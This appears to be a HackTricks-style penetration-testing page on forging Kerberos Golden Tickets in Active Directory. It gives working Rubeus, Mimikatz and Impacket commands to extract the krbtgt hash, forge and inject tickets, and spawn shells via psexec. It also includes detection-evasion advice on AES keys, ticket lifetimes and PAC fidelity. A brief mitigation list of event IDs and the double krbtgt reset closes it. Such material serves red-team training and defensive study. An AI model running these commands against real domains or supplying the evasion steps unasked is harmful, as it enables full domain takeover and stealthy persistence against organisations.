# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

A **Golden Ticket** attack consists of the **creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user** through the use of the **NTLM hash of the Active Directory (AD) krbtgt account**. This technique is particularly advantageous because it **enables access to any service or machine** within the domain as the impersonated user. It's crucial to remember that the **krbtgt account's credentials are never automatically updated**.

To **acquire the NTLM hash** of the krbtgt account, various methods can be employed. It can be extracted from the **Local Security Authority Subsystem Service (LSASS) process** or the **NT Directory Services (NTDS.dit) file** located on any Domain Controller (DC) within the domain. Furthermore, **executing a DCsync attack** is another strategy to obtain this NTLM hash, which can be performed using tools such as the **lsadump::dcsync module** in Mimikatz or the **secretsdump.py script** by Impacket. It's important to underscore that to undertake these operations, **domain admin privileges or a similar level of access is typically required**.

Although the NTLM hash serves as a viable method for this purpose, it is **strongly recommended** to **forge tickets using the Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** for operational security reasons. This is even more important in modern domains because **RC4 usage is being phased out** and stands out much more clearly in Kerberos telemetry.

```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```

### Modern ticket crafting notes

When possible, **query LDAP and SYSVOL first** and then forge the ticket using the real domain policy and user PAC values instead of inventing them manually:

```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```

- `/ldap` asks the DC for the user, group, NetBIOS and policy data used to build a more realistic PAC.
- `/printcmd` prints an offline command line containing the retrieved PAC fields, which is useful if you later want to forge the same ticket without touching LDAP again.
- `/extendedupndns` adds the newer `UpnDns` PAC elements containing the `samAccountName` and account SID.
- `/oldpac` removes the newer `Requestor` and `Attributes` PAC buffers; this is mainly useful for compatibility testing against older environments, not for default tradecraft.

From Linux, recent Impacket versions also support adding the newer PAC structures and setting a realistic validity period:

```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -user-id 500 -groups 512,513,518,519 -duration 10 \
  -extra-pac administrator
```

- `-duration` is in **hours**. The default is **10 years**, which is noisy.
- `-extra-pac` adds the newer `UPN_DNS` PAC information.
- `-old-pac` forces the legacy PAC layout.
- `-extra-sid` is useful when the PAC needs additional SIDs (for example, in child-to-parent escalation scenarios, which are covered in [SID-History Injection](sid-history-injection.md)).

**Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like you cannot get a shell via winrm).

### Bypassing common detections

The most frequent ways to detect a golden ticket are by **inspecting Kerberos traffic** on the wire. By default, Mimikatz **signs the TGT for 10 years**, which will stand out as anomalous in subsequent TGS requests made with it.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).

```
Get-DomainPolicy | select -expand KerberosPolicy
```

Unfortunately, the TGT's lifetime is not logged in 4769's, so you won't find this information in the Windows event logs. However, what you can correlate is **seeing 4769's without a prior 4768**. It's **not possible to request a TGS without a TGT**, and if there is no record of a TGT being issued, we can infer that it was forged offline.

In **newer Windows builds**, Event IDs **4768** and **4769** also expose much better **encryption type telemetry**. A forged TGT/TGS using **RC4 (`0x17`)** in a domain where `krbtgt`, clients and services already have AES keys is much easier to spot than it was a few years ago. This is one more reason to prefer **AES-backed Golden Tickets** and to match the domain's normal Kerberos policy as closely as possible.

Another OPSEC issue is **PAC fidelity**. Tickets with impossible group memberships, missing newer PAC buffers, or account metadata that doesn't match LDAP are easier to detect when defenders validate PAC contents against AD data. If you need a TGT that looks like it was really issued by a DC, review:

{{#ref}}
diamond-ticket.md
{{#endref}}

There are also **environmental limits** to persistence. The `krbtgt` account keeps a **password history of 2**, so a forged TGT can remain valid across the **first** `krbtgt` reset if it was signed with the previous key. This is why defenders invalidate Golden Tickets by **resetting `krbtgt` twice** and waiting at least the domain's maximum ticket lifetime between resets.

In order to **bypass this detection** check the diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Other little tricks defenders can do are **alert on 4769's for sensitive users** such as the default domain administrator account and alert on **RC4 usage for `krbtgt`** in domains that normally issue AES tickets.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
